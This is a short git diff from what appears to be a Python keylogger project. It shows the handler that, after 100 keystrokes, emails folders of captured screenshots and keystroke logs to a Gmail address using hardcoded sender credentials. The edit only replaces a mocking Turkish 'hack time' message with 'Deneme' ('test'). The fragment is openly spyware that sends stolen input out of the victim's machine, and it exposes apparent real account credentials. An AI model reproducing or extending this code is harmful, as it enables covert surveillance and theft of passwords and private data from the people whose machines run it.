@@ -26,7 +26,7 @@ def on_press(key):
 
     if key_count >= 100:
         mail = Mail("thewolverine0743@gmail.com", "123456tw", "ibatuhanbrl@gmail.com", "keylogger")
-        mail.attach_text("Sen cidden bana inandın mı ya kıyamam. Şimdi hack vaktiiii. PUHAHHAHAHAHAHHAHAH")
+        mail.attach_text("Deneme")
         mail.attach_directory(r"C:/Users/ibatu/PycharmProjects/HackTools/Keyloggers/Resources/Screenshots/")
         mail.attach_directory(r"C:/Users/ibatu/PycharmProjects/HackTools/Keyloggers/Resources/Logs/")
         mail.send_mail()
